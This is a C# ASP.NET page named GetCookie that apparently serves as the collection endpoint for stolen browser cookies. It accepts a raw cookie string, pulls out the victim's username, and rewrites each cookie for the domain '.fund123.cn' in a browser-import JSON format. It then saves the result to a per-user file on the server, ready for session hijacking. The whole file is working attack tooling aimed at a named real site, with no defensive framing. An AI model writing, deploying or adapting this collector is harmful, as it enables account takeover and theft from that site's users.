using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Web;
using System.Web.Script.Serialization;
using System.Web.UI;
using System.Web.UI.WebControls;

namespace GetCookie
{
    public partial class Index : System.Web.UI.Page
    {
        protected void Page_Load(object sender, EventArgs e)
        {
            HttpCookieCollection coolies = Request.Cookies;
            string cookie = Request.Params["cookie"];
            string path = AppDomain.CurrentDomain.BaseDirectory;
            string s = HttpContext.Current.Server.MapPath("");
            if (string.IsNullOrEmpty(cookie))
            {
                Response.Write("Load Done");
                Response.End();
            }

            string[] cookies = cookie.Split(';');

            List<CookieObj> cookieList = new List<CookieObj>();
            int index = 1;

            string userName = "";
            foreach (string ck in cookies)
            {
                int firstSplitIndex = ck.IndexOf('=');

                CookieObj cookieObj = new CookieObj();
                cookieObj.name = ck.Substring(0, firstSplitIndex).Trim();
                cookieObj.value = ck.Substring(firstSplitIndex + 1, ck.Length - firstSplitIndex - 1).Trim();
                if (cookieObj.name == "username")
                {
                    userName = cookieObj.value;
                }
                cookieObj.expirationDate = 1441971714;
                cookieObj.hostOnly = false;
                cookieObj.httpOnly = false;
                cookieObj.path = "/";
                cookieObj.secure = false;
                cookieObj.session = true;
                cookieObj.storeId = "0";
                cookieObj.domain = ".fund123.cn";
                cookieObj.id = index;
                cookieList.Add(cookieObj);


                index++;
            }

            JavaScriptSerializer jss = new JavaScriptSerializer();
            string jsonCookie = jss.Serialize(cookieList);

            using (FileStream fs = new FileStream(path + userName + "_cookies.txt", FileMode.Create, FileAccess.Write))
            {
                StreamWriter sw = new StreamWriter(fs);
                sw.WriteLine(jsonCookie);
                sw.Flush();
                sw.Close();
            }

        }
    }

    public class CookieObj
    {
        public string domain;
        public int expirationDate;
        public bool hostOnly;
        public bool httpOnly;
        public string name;
        public string path;
        public bool secure;
        public bool session;
        public string storeId;
        public string value;
        public int id;
    }
}